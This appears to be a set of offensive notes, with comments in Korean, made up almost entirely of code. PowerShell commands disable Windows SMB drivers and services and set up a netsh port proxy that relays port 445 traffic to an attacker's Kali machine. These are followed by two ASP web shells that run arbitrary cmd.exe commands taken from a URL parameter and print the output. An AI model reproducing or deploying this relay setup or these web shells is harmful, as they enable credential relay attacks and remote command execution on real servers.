8# SMB 관련 커널 드라이버 시작 유형을 Disabled(4)로 변경
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srvnet" -Name "Start" -Value 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv2" -Name "Start" -Value 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv" -Name "Start" -Value 4

# IP helper 및 SMB 종속 서비스 중지
Stop-Service -Name iphlpsvc -Force
Stop-Service -Name LanmanServer -Force


# Windows 기능 수준에서 SMB1 및 File Sharing 기능 비활성화
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart



# 윈도우 445 포트로 들어오는 요청을 칼리 리눅스(IP)의 445 포트로 바로 릴레이
netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=445 connectaddress=<칼리_IP>



<%
  ' 서버 시스템 명령어를 실행하는 ASP 코드
  Dim oShell
  Set oShell = Server.CreateObject("WScript.Shell")
  oShell.Run "cmd.exe /c " & Request.QueryString("cmd")
%>





<%
  Dim szCMD, oScript, oCmdExec, strOutput
  szCMD = Request("cmd") ' URL이나 POST 파라미터로 명령어를 전달받음

  ' WScript.Shell 객체 생성
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  
  ' 시스템 명령 실행 및 출력 결과 수집
  Set oCmdExec = oScript.Exec("cmd.exe /c " & szCMD)
  strOutput = oCmdExec.StdOut.ReadAll
  
  ' 웹 화면에 결과 출력
  Response.Write("<pre>" & strOutput & "</pre>")
%>



